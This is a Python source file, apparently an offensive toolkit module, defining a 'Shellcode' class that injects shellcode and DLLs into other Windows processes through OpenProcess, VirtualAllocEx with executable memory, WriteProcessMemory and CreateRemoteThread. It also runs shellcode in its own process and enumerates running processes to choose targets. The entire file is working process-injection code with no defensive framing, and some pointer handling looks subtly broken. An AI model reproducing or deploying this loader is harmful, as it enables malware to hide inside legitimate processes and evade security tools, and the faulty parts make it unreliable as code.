from __future__ import annotations
import os
import ctypes
import platform
import subprocess
import base64
from ctypes import *
from ctypes.wintypes import *
from typing import Optional, Tuple, List, Dict, Any
import logging
from pathlib import Path

class Shellcode:
    def __init__(self) -> None:
        # Windows API constants
        self.PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
        self.MEM_COMMIT = 0x00001000
        self.MEM_RESERVE = 0x00002000
        self.PAGE_EXECUTE_READWRITE = 0x40
        
        # Load required DLLs
        self.kernel32 = ctypes.windll.kernel32
        self.user32 = ctypes.windll.user32
        self.logger = logging.getLogger(__name__)
        
    def inject_shellcode(self, pid: int, shellcode: bytes) -> bool:
        """Inject shellcode into process

        Args:
            pid (int): Target process ID
            shellcode (bytes): Shellcode to inject

        Returns:
            bool: True if injection successful
        """
        try:
            # Open process
            h_process = self.kernel32.OpenProcess(
                self.PROCESS_ALL_ACCESS,
                False,
                pid
            )
            
            if not h_process:
                self.logger.error(f"Failed to open process {pid}")
                return False
                
            try:
                # Allocate memory
                addr = self.kernel32.VirtualAllocEx(
                    h_process,
                    0,
                    len(shellcode),
                    self.MEM_COMMIT | self.MEM_RESERVE,
                    self.PAGE_EXECUTE_READWRITE
                )
                
                if not addr:
                    raise Exception("Memory allocation failed")
                    
                # Write shellcode
                written = c_size_t()
                success = self.kernel32.WriteProcessMemory(
                    h_process,
                    addr,
                    shellcode,
                    len(shellcode),
                    byref(written)
                )
                
                if not success or written.value != len(shellcode):
                    raise Exception("Failed to write shellcode")
                    
                # Create thread to execute
                thread_id = c_ulong()
                if not self.kernel32.CreateRemoteThread(
                    h_process,
                    None,
                    0,
                    addr,
                    None,
                    0,
                    byref(thread_id)
                ):
                    raise Exception("Failed to create remote thread")
                    
                self.logger.info(f"Injected shellcode into PID {pid}")
                return True
                
            finally:
                self.kernel32.CloseHandle(h_process)
                
        except Exception as e:
            self.logger.error(f"Shellcode injection error: {str(e)}")
            return False
            
    def execute_shellcode(self, shellcode: bytes) -> bool:
        """Execute shellcode in current process

        Args:
            shellcode (bytes): Shellcode to execute

        Returns:
            bool: True if execution successful
        """
        try:
            # Allocate memory
            ptr = self.kernel32.VirtualAlloc(
                c_int(0),
                c_int(len(shellcode)),
                c_int(self.MEM_COMMIT | self.MEM_RESERVE),
                c_int(self.PAGE_EXECUTE_READWRITE)
            )
            
            if not ptr:
                raise Exception("Memory allocation failed")
                
            # Copy shellcode
            buf = (c_char * len(shellcode)).from_buffer(shellcode)
            success = self.kernel32.RtlMoveMemory(
                c_int(ptr),
                buf,
                c_int(len(shellcode))
            )
            
            if not success:
                raise Exception("Failed to copy shellcode")
                
            # Execute
            thread_id = c_ulong()
            if not self.kernel32.CreateThread(
                c_int(0),
                c_int(0),
                c_int(ptr),
                c_int(0),
                c_int(0),
                byref(thread_id)
            ):
                raise Exception("Failed to create thread")
                
            self.logger.info("Executed shellcode in current process")
            return True
            
        except Exception as e:
            self.logger.error(f"Shellcode execution error: {str(e)}")
            return False
            
    def get_process_list(self) -> List[Dict[str, Any]]:
        """Get list of running processes

        Returns:
            List[Dict[str, Any]]: List of process information
        """
        processes = []
        try:
            # Use WMI to get process info
            output = subprocess.check_output(
                "wmic process get ProcessId,Name,ExecutablePath",
                shell=True,
                text=True
            )
            
            # Parse output
            lines = output.splitlines()
            for line in lines[1:]:
                parts = line.strip().split()
                if len(parts) >= 2:
                    try:
                        processes.append({
                            'pid': int(parts[-1]),
                            'name': parts[0],
                            'path': ' '.join(parts[1:-1]) if len(parts) > 2 else None
                        })
                    except:
                        continue
                        
        except Exception as e:
            self.logger.error(f"Error getting process list: {str(e)}")
            
        return processes
        
    def inject_dll(self, pid: int, dll_path: str) -> bool:
        """Inject DLL into process

        Args:
            pid (int): Target process ID
            dll_path (str): Path to DLL file

        Returns:
            bool: True if injection successful
        """
        try:
            # Open process
            h_process = self.kernel32.OpenProcess(
                self.PROCESS_ALL_ACCESS,
                False,
                pid
            )
            
            if not h_process:
                raise Exception(f"Failed to open process {pid}")
                
            try:
                # Get LoadLibraryA address
                h_kernel32 = self.kernel32.GetModuleHandleA("kernel32.dll")
                h_loadlib = self.kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")
                
                # Allocate memory for DLL path
                addr = self.kernel32.VirtualAllocEx(
                    h_process,
                    0,
                    len(dll_path),
                    self.MEM_COMMIT | self.MEM_RESERVE,
                    self.PAGE_EXECUTE_READWRITE
                )
                
                if not addr:
                    raise Exception("Memory allocation failed")
                    
                # Write DLL path
                written = c_size_t()
                if not self.kernel32.WriteProcessMemory(
                    h_process,
                    addr,
                    dll_path.encode(),
                    len(dll_path),
                    byref(written)
                ):
                    raise Exception("Failed to write DLL path")
                    
                # Create thread to load DLL
                thread_id = c_ulong()
                if not self.kernel32.CreateRemoteThread(
                    h_process,
                    None,
                    0,
                    h_loadlib,
                    addr,
                    0,
                    byref(thread_id)
                ):
                    raise Exception("Failed to create remote thread")
                    
                self.logger.info(f"Injected DLL into PID {pid}")
                return True
                
            finally:
                self.kernel32.CloseHandle(h_process)
                
        except Exception as e:
            self.logger.error(f"DLL injection error: {str(e)}")
            return False
            
    def is_process_64bit(self, pid: int) -> Optional[bool]:
        """Check if process is 64-bit

        Args:
            pid (int): Process ID to check

        Returns:
            Optional[bool]: True if 64-bit, False if 32-bit, None if error
        """
        try:
            # Open process
            h_process = self.kernel32.OpenProcess(
                self.PROCESS_ALL_ACCESS,
                False,
                pid
            )
            
            if not h_process:
                return None
                
            try:
                # Get process info
                is_wow64 = c_bool()
                if self.kernel32.IsWow64Process(
                    h_process,
                    byref(is_wow64)
                ):
                    return not is_wow64.value
                    
            finally:
                self.kernel32.CloseHandle(h_process)
                
        except Exception as e:
            self.logger.error(f"Error checking process architecture: {str(e)}")
            
        return None